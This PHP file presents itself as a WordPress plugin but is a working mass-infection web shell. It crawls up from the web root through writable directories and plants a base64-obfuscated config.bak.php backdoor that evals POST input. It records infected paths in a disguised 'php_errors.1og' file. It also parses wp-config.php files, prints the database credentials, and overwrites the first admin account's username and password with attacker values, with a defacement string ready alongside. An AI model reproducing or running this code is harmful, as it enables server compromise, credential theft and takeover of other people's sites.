<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */

error_reporting(0);
ignore_user_abort(true);
header("content-Type: text/html; charset=gb2312");
$zh = "Nabilaholic404"; // zone-h nick
$jembut = "adminlin"; // add username wordpress
$jembut2 = "admin_lin"; // add password wordpress
$kontol = "Hacked by LinuxSec <?php @eval($_POST[lincx]);?>"; // script deface


function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}



function copy_db($dest){

$baca = file_get_contents($dest);
 
 /* symlink('/home/'.$user.'/public_html/wp-config.php',$user.'- config.txt');  */

if($baca!=""){
	

/* $b = `cp /home/$user/public_html/index.php $user-index.txt`; */

$file1 = "$user-config.txt";
$fp2 = fopen($file1,"w");
fputs($fp2,$baca);

$file = @file_get_contents($dest);


echo $user."-> sukses<br>";
					$host = ambilkata($file,"DB_HOST', '","'");
					$username = ambilkata($file,"DB_USER', '","'");
					$password = ambilkata($file,"DB_PASSWORD', '","'");
					$db = ambilkata($file,"DB_NAME', '","'");
					$dbprefix = ambilkata($file,"table_prefix  = '","'");
					$user_baru = $jembut;
					$password_baru = $jembut2;
					$prefix = $db.".".$dbprefix."users";
					$sue = $db.".".$dbprefix."options";
					$pass = md5("$password_baru");
					$nick = $kontol;

echo "# Db Host: $host<br>";
echo "# Db user: $username<br>";
echo "# Db Password: $password<br>";
echo "# Db name: $db<br>";
echo "# Table_Prefix: $dbprefix<br>";

mysql_connect($host,$username,$password);

        mysql_select_db($db);

		$tampil=mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
   		$r=mysql_fetch_array($tampil);
        $id = $r[ID];

        $tampil2=mysql_query("SELECT * FROM $sue ORDER BY option_id ASC");
   		$r2=mysql_fetch_array($tampil2);
        $target = $r2[option_value];
         echo "# $target<br>";
        

         mysql_query("UPDATE $prefix SET user_pass='$pass',user_login='$user_baru' WHERE ID='$id'");
}




	}



function copy_file1($dest){
  file_put_contents($dest.DIRECTORY_SEPARATOR.'config.bak.php',base64_decode('PD9waHAgDQovKioNCiAqIFBsdWdpbiBOYW1lOiBDTVNtYXAgLSBXb3JkUHJlc3MgU2hlbGwNCiAqIFBsdWdpbiBVUkk6IGh0dHBzOi8vZ2l0aHViLmNvbS9tN3gvY21zbWFwLw0KICogRGVzY3JpcHRpb246IFNpbXBsZSBXb3JkUHJlc3MgU2hlbGwgLSBVc2FnZSBvZiBDTVNtYXAgZm9yIGF0dGFja2luZyB0YXJnZXRzIHdpdGhvdXQgcHJpb3IgbXV0dWFsIGNvbnNlbnQgaXMgaWxsZWdhbC4gSXQgaXMgdGhlIGVuZCB1c2VyJ3MgcmVzcG9uc2liaWxpdHkgdG8gb2JleSBhbGwgYXBwbGljYWJsZSBsb2NhbCwgc3RhdGUgYW5kIGZlZGVyYWwgbGF3cy4gRGV2ZWxvcGVyIGFzc3VtZXMgbm8gbGlhYmlsaXR5IGFuZCBpcyBub3QgcmVzcG9uc2libGUgZm9yIGFueSBtaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uDQogKiBWZXJzaW9uOiAxLjANCiAqIEF1dGhvcjogQ01TbWFwDQogKiBBdXRob3IgVVJJOiBodHRwczovL2dpdGh1Yi5jb20vbTd4L2Ntc21hcC8NCiAqIExpY2Vuc2U6IEdQTHYyDQogKi8NCmZvcmVhY2goJF9QT1NUIGFzICRrID0+ICR2KXsNCgkka2sgPSBAcGFjaygiSCoiLCAkayk7DQoJJF9QT1NUWyRra109QHBhY2soIkgqIiwgJHYpOw0KfQ0KQGV2YWwoJF9QT1NUWydwYXNzJ10pOw0KPz4NCnBvc3RwYXNzDQo='));

}



function writeTxt($content,$fileurl){
    $fp=fopen($fileurl,"a+");
    if($fp){
        fwrite($fp,$content);
    }
    fclose($fp);
    
  }

function listDir($dir){
   if(is_dir($dir)){
     if ($dh = opendir($dir)) {
        while (($file= readdir($dh)) !== false){
		
       if((is_dir($dir."/".$file)) && $file!="." && $file!="..")
       {
	    if(is_writable($dir."/".$file)&&is_readable($dir."/".$file))
		{
		     if(strpos($dir.$file,'.') !== false){ 
			       	  
			       	  if(is_dir($dir.$file.'//wp-includes//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}
						if(is_dir($dir.$file.'//images//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}


			       	  if(is_dir($dir.$file.'//modules//')){
			       	  	copy_file1($dir.$file);
			       	  	writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> modules</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_dir($dir.$file.'//public_html//')){
			       	  	copy_file1($dir.$file.'//public_html//');
			       	  	writeTxt($dir.$file.'//public_html//',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> publichtml</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_file($dir.$file.'//index.php'))

{

copy_file1($dir.$file);
			       	  	writeTxt($dir.$file.'//index.php',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> indexok</font>"."<br><hr>";

}

if(is_file($dir.$file.'//default.php'))

{

copy_file1($dir.$file);
			       	  	writeTxt($dir.$file.'//index.php',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> indexok</font>"."<br><hr>";

}

if(is_file($dir.$file.'//wp-config.php'))

{

copy_db($dir.$file.'//wp-config.php');
			       	  	//writeTxt($dir.$file.'//index.php',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpdb</font>"."<br><hr>";

}







			       	}
		}else{
		if(is_writable($dir."/".$file))
		{
			       
			       if(strpos($dir.$file,'.') !== false){ 
			       	  if(is_dir($dir.$file.'//wp-includes//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}
			       	  if(is_dir($dir.$file.'//modules//')){
			       	  	copy_file1($dir.$file);
			       	  	writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> modules</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_dir($dir.$file.'//public_html//')){
			       	  	copy_file1($dir.$file.'//public_html//');
			       	  	writeTxt($dir.$file.'//public_html//',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> publichtml</font>"."<br><hr>";
			       	  	
			       	  	}
			       	}
              
		}else
		{
	      
		}
		}
		
		listDir($dir."/".$file."/");
       }
     
       }
        }
closedir($dh);

     }
 
   }

ListDir($_SERVER['DOCUMENT_ROOT'].'//..//..//..//..//..//');
?>
